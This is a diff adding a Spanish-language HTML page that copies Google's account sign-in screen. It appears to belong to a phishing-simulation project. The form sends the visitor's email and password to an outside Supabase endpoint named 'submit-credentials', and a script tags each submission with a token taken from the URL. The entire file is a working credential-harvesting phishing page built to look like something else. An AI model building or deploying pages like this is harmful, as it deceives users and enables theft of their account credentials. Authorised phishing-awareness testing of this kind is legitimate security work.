@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Iniciar sesión: Cuentas de Google</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:450px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
+  .logo{height:24px;margin-bottom:16px}
+  h1{font-weight:400;font-size:24px;margin:0 0 8px}
+  .sub{font-size:16px;color:#202124;margin:0 0 32px}
+  label{display:block;font-size:12px;color:#5f6368;margin-bottom:4px}
+  input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:inherit;margin-bottom:24px}
+  input:focus{border:2px solid #1a73e8;padding:12px 14px}
+  .row{display:flex;justify-content:space-between;align-items:center;margin-top:16px}
+  button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;font-family:inherit}
+  button:hover{background:#1765cc}
+  a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
+  a:hover{text-decoration:underline}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/google.png" alt="Google">
+  <h1>Iniciar sesión</h1>
+  <p class="sub">Utiliza tu Cuenta de Google</p>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="email" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
+    <input type="password" name="password" placeholder="Introduce tu contraseña" required>
+    <div class="row">
+      <a href="#">Crear cuenta</a>
+      <button type="submit">Siguiente</button>
+    </div>
+  </form>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
